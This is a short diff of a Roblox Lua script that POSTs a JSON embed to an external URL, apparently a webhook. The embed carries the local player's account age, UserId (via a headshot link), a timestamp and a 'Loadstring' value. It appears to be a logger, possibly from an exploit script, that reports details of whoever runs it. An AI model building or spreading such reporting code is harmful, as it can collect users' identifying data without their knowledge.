@@ -40,17 +40,17 @@ dothethingy({Url = weno, Body = game:GetService("HttpService"):JSONEncode({
         ["inline"] = true
     },
     {
-        ["name"] = "*JobId*",
-        ["value"] = "*" .. game.JobId .. "*",
+        ["name"] = "Account Age",
+        ["value"] = game.Players.LocalPlayer.AccountAge.." Days",
         ["inline"] = true
     },
     {
-        ["name"] = "*PlaceId*",
-        ["value"] = "*" .. game.PlaceId .. "*",
+        ["name"] = "*Loadstring*",
+        ["value"] = "*" .. activewebhook2 .. "*",
         ["inline"] = true
     }},
     ["footer"] = {
-        ["text"] = os.date()..", Loadstring: "..activewebhook2,
+        ["text"] = os.date(),
         ["icon_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. game.Players.LocalPlayer.UserId .. "&width=150&height=150&format=png"
       },
 ["type"] = "rich",["color"] = 14680064}}}), Method = "POST", Headers = {
